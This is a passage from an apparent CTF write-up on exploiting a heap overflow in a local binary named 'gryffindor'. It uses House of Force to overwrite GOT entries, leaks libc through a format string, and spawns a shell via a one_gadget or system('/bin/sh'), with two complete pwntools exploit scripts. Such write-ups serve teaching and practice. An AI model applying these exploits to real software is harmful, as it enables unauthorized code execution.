class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br></pre></td></tr></table></figure></p><p>Looking at the heap after we overflow it:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/E5n4gQ9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/E5n4gQ9.png" alt=""><br></a></p><p>Now we can force <strong>malloc</strong> to return the pointer <strong>P</strong> we need by just passing the calculation <strong>P - &amp;top_chunk</strong> as the size, after this the next <strong>malloc</strong> will return the pointer we want:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-top_chunk), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>) <span class="comment"># this malloc will return got address of atoll</span></span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>The look on gdb after executing <strong>malloc</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/QEJDPzY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QEJDPzY.png" alt=""><br></a></p><p><strong>atoll</strong> and <strong>atoi</strong> are different functions they almost do the same thing yet they are being used in different places in the binary, the one we want is actually <strong>atoi</strong>, you must be asking why didn’t I used <strong>house of force</strong> on the <strong>atoi</strong> address, well when I was using the <strong>atoi</strong> address with house of force for some reason I was getting an segmentation fault, can’t really explain why because I didn’t understand it, well if you know why this happens feel free to write in the comments I would really appreciate that. To circumvent this I used the <strong>atoll</strong> GOT, we can still overwrite <strong>atoi</strong> but we will need to override other got addresses because <strong>malloc</strong>, <strong>setvbuf</strong> are between them as you can see bellow:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CzM2iJi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CzM2iJi.png" alt=""><br></a></p><p>So to not break the binary we should not override them with junk so thats why i’m setting it to their <strong>plts</strong> in this line of code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br></pre></td></tr></table></figure><p>Now that we override the <strong>atoi</strong> GOT with the printf PLT we can use format_string to leak addresses from the stack:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span><span class="number">-32</span><span class="number">-32</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br></pre></td></tr></table></figure><p>After printf is executed, if we leak the first 3 addresses from the stack we can see the 1st one is an address from the stack and the 3rd is an address from <strong>libc</strong>, we can calculate the offset to the by using gdb</p><p><a data-fancybox="gallery" href="https://i.imgur.com/mwWbfyZ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mwWbfyZ.png" alt=""><br></a></p><h2 id="Spawning-a-shell"><a href="#Spawning-a-shell" class="headerlink" title="Spawning a shell"></a>Spawning a shell</h2><p>I ended up doing this in two ways: </p><ol><li>Overwriting <strong>exit GOT address</strong> with <strong>one_gadget</strong> by using format string.</li><li>Overwriting <strong>atoi GOT address</strong> (now printf) with <strong>system</strong> from libc, and send <strong>/bin/sh</strong> as string.</li></ol><p>I will explain the first one since it’s a little more difficult and the 2nd is just a repetition of what we did before with the only difference of <strong>atoi</strong> is now <strong>printf</strong>, which can complicate a little bit the things:</p><h3 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_HIGH)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; <span class="number">16</span></span><br><span class="line">ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW0)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW1)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%7$llnCC'</span>+</span><br><span class="line">    p64(STACK_ADDRESS)) <span class="comment"># sets the one_gadget constraint to null</span></span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">r.sendline(<span class="string">'111'</span>) <span class="comment"># sends option 4 to exit the program</span></span><br><span class="line">                  <span class="comment"># atoi is now printf, the return value</span></span><br><span class="line">                  <span class="comment"># of printf is the number of characters</span></span><br><span class="line">                  <span class="comment"># printed so if we want option 4 we need</span></span><br><span class="line">                  <span class="comment"># to send 4 chars, in this case 3 "1s" and</span></span><br><span class="line">                  <span class="comment"># "\n" new line character</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>I separated the <strong>one_gadget</strong> from libc address in 3 parts so it’s easier to perform the format string, I won’t explain how I did it in detail, if you want to learn how to do a format string in detail you can check my other write up <a href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/">here</a>, to get the offset for the one_gadget you can use this <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">tool</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget libc.so.6 </span><br><span class="line">0x45216execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>I used the offset <strong>0x4526a</strong> it has a constraint in rsp+0x30, we can use once again format string to set this constraints to null, since we leaked a stack address before we can calculate the offset from the leaked adress with the same trick we used to calculate the offset to <strong>libc_base</strong> by using gdb.</p><p>The full exploit using format string</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(choice)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(index)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(size)</span><br><span class="line">    r.sendline(inp)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#   b *0x400bd9</span></span><br><span class="line"><span class="comment">#   """)</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">top_chunk = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (top_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-top_chunk), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>)</span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">    p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span><span class="number">-32</span><span class="number">-32</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># Replace exit got with one_gadget using format string</span></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_HIGH)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; <span class="number">16</span></span><br><span class="line">ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW0)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]+<span class="number">2</span>))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%&#123;&#125;x%9$hn'</span>.format(ONE_GADGET_LOW1)+</span><br><span class="line">    <span class="string">'A'</span>*<span class="number">12</span>+p64(binary.got[<span class="string">'exit'</span>]))</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'%7$llnCC'</span>+</span><br><span class="line">    p64(STACK_ADDRESS)) <span class="comment"># sets the one_gadget constraint to null</span></span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">r.sendline(<span class="string">'111'</span>) <span class="comment"># sends option 4 to exit the program</span></span><br><span class="line"><span class="comment">#####################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The exploit using house of force a 2nd time to spawn a shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(size)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> choice == <span class="string">'3'</span>:</span><br><span class="line">        r.recv()</span><br><span class="line">r.sendline(choice)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.send(choice)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(index)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="keyword">if</span> choice == <span class="string">'3'</span>:</span><br><span class="line">r.sendline(size)</span><br><span class="line">r.sendline(inp)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.send(size)</span><br><span class="line">r.sendline(inp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print sys.path[0]</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#b *0x400af0</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line"><span class="comment">#b *0x400bd9</span></span><br><span class="line"><span class="comment">#       b *0x400BCD</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line"><span class="comment">#       b *0x400BB5</span></span><br><span class="line"><span class="comment">#b *0x400989</span></span><br><span class="line"><span class="comment">#b *0x400bd9</span></span><br><span class="line"><span class="comment">#b *0x400BD9</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">heap = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (heap))</span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-heap), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>)</span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br><span class="line"><span class="comment">#edit_g('130', '2', p64(binary.plt['read']+6))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0xf1117</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># Replace exit got with one_gadget using format string</span></span><br><span class="line">rop = p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) + \</span><br><span class="line">p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) + \</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) + \</span><br><span class="line">    p64(SYSTEM)</span><br><span class="line">edit_g(<span class="string">'A'</span>*<span class="number">31</span>+<span class="string">'\x00'</span>, <span class="string">'22\x00'</span>, rop, choice=<span class="string">'111\x00'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#r.recvuntil('&gt;&gt;')</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf" target="_blank" 